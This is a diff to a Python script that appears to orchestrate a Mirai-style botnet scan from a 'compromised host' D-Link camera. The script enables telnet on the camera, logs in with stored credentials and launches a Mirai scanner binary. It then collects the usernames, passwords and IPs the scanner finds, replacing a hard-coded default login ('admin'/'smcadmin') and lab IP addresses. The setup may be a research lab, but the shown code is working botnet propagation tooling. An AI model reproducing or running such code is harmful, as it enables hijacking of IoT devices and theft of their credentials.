@@ -5,7 +5,7 @@ import re
 import time
 
 
-from constants import (USERNAME,PASSWORD,COMPROMISED_HOST,VICTIM_HOST,MIRAI_SCAN_BIN)
+from constants import (USERNAME,PASSWORD,COMPROMISED_HOST,VICTIM_HOST,MIRAI_SCAN_BIN,TELNET_PORT)
 from telnet_service import enable_telnet, upload_file_to_dlink_cam
 
 telnet_enabled = False  
@@ -13,14 +13,7 @@ telnet_enabled = False
 
 
 def prepare_hosts_for_scanning():
-    #global telnet_enabled  
 
-    # tn_1 = is_telnet_already_enabled("10.10.10.6")
-    # time.sleep(1)
-    # tn_2 = is_telnet_already_enabled("10.10.10.23")
-    # time.sleep(1)
-    # if not tn_1 or not tn_2:
-    #     print("Enabling Telnet for the first time...")
 
     status_code = enable_telnet(COMPROMISED_HOST)
     if status_code != 200:
@@ -57,11 +50,8 @@ def start_scanning_service(endpoint):
 
 
 
-    telnet_host = "10.10.10.6"
-    telnet_port = 23
-
     try:
-        with telnetlib.Telnet(telnet_host, telnet_port, timeout=10) as tn:
+        with telnetlib.Telnet(COMPROMISED_HOST, TELNET_PORT, timeout=10) as tn:
             tn.read_until(b"login: ")
             tn.write(USERNAME.encode('utf-8') + b"\n")
             tn.read_until(b"Password: ")
@@ -135,9 +125,14 @@ def start_scanning_service(endpoint):
                                 username = scanners[fd]['creds'].split(":")[0]
                                 password = scanners[fd]['creds'].split(":")[1].strip()
                                 ip = scanners[fd]['ip']
+                                # cred = {
+                                #     "username": "admin",
+                                #     "password": "smcadmin",
+                                #     "ip": ip,
+                                # }
                                 cred = {
-                                    "username": "admin",
-                                    "password": "smcadmin",
+                                    "username": username,
+                                    "password": password,
                                     "ip": ip,
                                 }
                                 if not send:
